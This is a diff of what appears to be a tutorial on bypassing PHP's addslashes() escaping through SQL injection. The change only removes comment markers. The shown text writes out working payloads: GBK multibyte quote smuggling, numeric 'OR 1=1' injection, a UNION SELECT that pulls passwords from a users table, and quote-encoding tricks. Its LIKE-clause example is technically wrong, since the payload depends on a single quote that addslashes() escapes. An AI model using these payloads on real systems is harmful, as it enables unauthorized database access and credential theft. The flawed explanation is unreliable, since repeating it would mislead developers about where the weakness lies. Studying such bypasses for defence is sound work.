@@ -20,10 +20,10 @@ $query = "SELECT * FROM users WHERE name = '$input'";
 
 Bypass:
 
-# Input: %bf%27 OR 1=1 --
-# After addslashes: %bf%5c%27 OR 1=1 --
-# In GBK charset: %bf%5c becomes 縗 (single character)
-# Result: SELECT * FROM users WHERE name = '縗' OR 1=1 --'
+Input: %bf%27 OR 1=1 --
+After addslashes: %bf%5c%27 OR 1=1 --
+In GBK charset: %bf%5c becomes 縗 (single character)
+Result: SELECT * FROM users WHERE name = '縗' OR 1=1 --'
 
 2. Second-Order SQL Injection
 When escaped data is stored and later used without re-escaping:
@@ -43,8 +43,8 @@ $query = "SELECT * FROM users WHERE id = $id"; // No quotes around $id
 
 Bypass:
 
-# Input: 1 OR 1=1
-# Query becomes: SELECT * FROM users WHERE id = 1 OR 1=1
+Input: 1 OR 1=1
+Query becomes: SELECT * FROM users WHERE id = 1 OR 1=1
 
 4. LIKE Clause Bypasses
 Using wildcards that aren't escaped by addslashes():
@@ -54,19 +54,19 @@ $query = "SELECT * FROM products WHERE name LIKE '%$search%'";
 
 Bypass:
 
-# Input: %' UNION SELECT password FROM users WHERE '1'='1
-# Works because % and _ are not escaped by addslashes()
+Input: %' UNION SELECT password FROM users WHERE '1'='1
+Works because % and _ are not escaped by addslashes()
 
 5. Encoding Bypasses
 Using different encodings to bypass filtering:
 
-# URL encoding
+URL encoding
 %2527 → %27 → ' (after URL decode)
 
-# Unicode encoding
+Unicode encoding
 \u0027 → ' (in some contexts)
 
-# Hex encoding
+Hex encoding
 0x27 → ' (in MySQL)
 
 Real-World Example
